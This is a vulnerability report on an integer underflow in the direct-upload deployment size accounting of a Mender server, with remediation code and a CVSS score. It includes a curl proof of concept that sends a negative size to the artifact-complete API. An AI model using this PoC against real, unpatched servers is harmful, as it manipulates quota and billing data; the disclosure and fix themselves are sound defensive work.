# VULN-001: Integer Underflow in Deployment Size Tracking

## Severity: MEDIUM

## Summary
An integer underflow vulnerability exists in the artifact upload mechanism that allows authenticated users to manipulate deployment size statistics by providing negative size values. This can lead to storage quota bypasses and accounting manipulation.

## Vulnerability Details

### Root Cause
The `DirectUploadMetadata.Size` field lacks proper validation:

**File**: `backend/services/deployments/model/release.go:228`
```go
type DirectUploadMetadata struct {
    Size    int64    `json:"size,omitempty" valid:"-"`  // ← NO VALIDATION!
    Updates []Update `json:"updates" valid:"-"`
}
```

The `Validate()` function (lines 234-248) does NOT check if `Size` is positive:
```go
func (m DirectUploadMetadata) Validate() error {
    if len(m.Updates) < 1 {
        return errors.New("empty updates update")
    }
    // ... NO SIZE VALIDATION ...
    return nil
}
```

### Attack Vector

**Prerequisites**:
- Attacker must have valid user authentication
- Admin must enable: `DEPLOYMENTS_STORAGE_DIRECT_UPLOAD_SKIP_VERIFY=true`
  - Default: `false` (line 58 in `config/config.go`)
  - Requires admin configuration change

**Exploit Flow**:

1. **Attacker requests upload link**:
   ```
   POST /api/management/v1/deployments/artifacts/directupload
   Authorization: Bearer <user_token>
   ```

2. **Attacker uploads artifact and completes with negative size**:
   ```
   PUT /api/management/v1/deployments/artifacts/<id>/complete
   Content-Type: application/json

   {
     "size": -9223372036854775808,
     "updates": [{
       "type_info": {"type": "rootfs-image"},
       "files": [{"name": "file", "size": 1024}]
     }]
   }
   ```

3. **Code Path**:
   - `api/http/api_deployments.go:566-586`: `CompleteUpload()` accepts metadata
   - `api/http/api_deployments.go:581`: Unmarshals user JSON
   - `api/http/api_deployments.go:583`: Validates (but NO size check!)
   - `app/app.go:454`: `size = metadata.Size` (NEGATIVE!)
   - `app/app.go:456-460`: Creates image with negative size
   - `app/app.go:1578`: Calls `IncrementDeploymentTotalSize()` with negative value
   - `store/mongo/datastore_mongo.go:2684`: MongoDB `$inc` with negative = SUBTRACTION!

4. **Result**: Deployment `TotalSize` underflows, potentially wrapping to large positive value or becoming negative

### Proof of Concept

```bash
# 1. Enable skipVerify (requires admin access)
export DEPLOYMENTS_STORAGE_DIRECT_UPLOAD_SKIP_VERIFY=true

# 2. Request upload link
curl -X POST https://mender-server/api/management/v1/deployments/artifacts/directupload \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"

# Response: {"id": "artifact-id", "upload_url": "...", ...}

# 3. Upload artifact to S3/storage (actual file upload)
curl -X PUT "$UPLOAD_URL" --upload-file malicious.mender

# 4. Complete with negative size
curl -X PUT https://mender-server/api/management/v1/deployments/artifacts/artifact-id/complete \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "size": -9223372036854775808,
    "updates": [{
      "type_info": {"type": "rootfs-image"},
      "files": [{"name": "rootfs", "size": 1024}]
    }]
  }'

# 5. Create deployment using this artifact
# When devices download, TotalSize decrements instead of increments
```

## Impact

### Direct Impact:
1. **Storage Quota Bypass**: Negative sizes reduce deployment total size, allowing unlimited deployments
2. **Accounting Manipulation**: If billing based on deployment size, attacker pays negative amounts
3. **Integer Overflow**: TotalSize can underflow to `math.MinInt` then wrap to positive
4. **System Invariant Violation**: Deployment statistics become incorrect

### Business Impact:
- Revenue loss if billing based on storage/deployment size
- Resource exhaustion if quotas bypassed
- Audit/compliance issues with incorrect metrics

## Affected Components

- `backend/services/deployments/model/release.go:228`
- `backend/services/deployments/api/http/api_deployments.go:566-586`
- `backend/services/deployments/app/app.go:452-460`
- `backend/services/deployments/app/app.go:1577-1580`
- `backend/services/deployments/store/mongo/datastore_mongo.go:2670-2689`

## Remediation

### Short-term Fix:
Add size validation in `DirectUploadMetadata.Validate()`:

```go
func (m DirectUploadMetadata) Validate() error {
    if len(m.Updates) < 1 {
        return errors.New("empty updates update")
    }
    if len(m.Updates) > maxDirectUploadUpdatesMetadata {
        return errors.New("updates array too large")
    }
    // ADD THIS CHECK:
    if m.Size < 0 {
        return errors.New("size must be non-negative")
    }
    for _, f := range m.Updates {
        err := f.Validate()
        if err != nil {
            return err
        }
    }
    return nil
}
```

### Long-term Fix:
1. Use `uint64` instead of `int64` for all size fields
2. Add bounds checking in `IncrementDeploymentTotalSize()`
3. Add database constraints to prevent negative values
4. Consider removing `skipVerify` feature entirely or restricting to admin-only API

## CVSS Score

**CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L**

- **Base Score**: 5.8 (MEDIUM)
- **Attack Vector**: Network (AV:N)
- **Attack Complexity**: High (AC:H) - requires admin misconfiguration
- **Privileges Required**: Low (PR:L) - authenticated user
- **User Interaction**: None (UI:N)
- **Scope**: Unchanged (S:U)
- **Confidentiality**: None (C:N)
- **Integrity**: High (I:H) - data manipulation
- **Availability**: Low (A:L) - potential resource exhaustion

## Timeline

- **Discovered**: 2025-11-27
- **Reported**: 2025-11-27
- **Status**: Unpatched

## References

- CWE-191: Integer Underflow (Wrap or Wraparound)
- CWE-682: Incorrect Calculation
- MongoDB `$inc` operator: https://docs.mongodb.com/manual/reference/operator/update/inc/
